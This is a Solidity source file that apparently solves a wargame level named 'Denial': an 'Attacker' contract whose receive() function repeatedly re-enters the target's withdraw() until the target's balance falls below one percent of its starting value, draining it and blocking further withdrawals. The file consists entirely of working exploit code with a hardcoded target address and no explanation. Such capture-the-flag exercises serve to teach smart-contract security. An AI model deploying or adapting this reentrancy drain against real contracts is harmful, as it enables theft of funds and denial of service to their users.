//SPDX-License-Identifier: MIT
pragma solidity 0.8.19;

import "./Level.sol";

contract Attacker {
    uint256 initialBalance;

    constructor() {
        initialBalance = Denial(payable(0xA8686F43004dA7d7FA77b730C72003cDaD1B863a)).contractBalance();
    }

    receive() external payable {
        Denial target = Denial(payable(msg.sender));
        uint256 balanceLeft = target.contractBalance();
        if (balanceLeft >= initialBalance / 100) {
            target.withdraw();
        }
    }
}
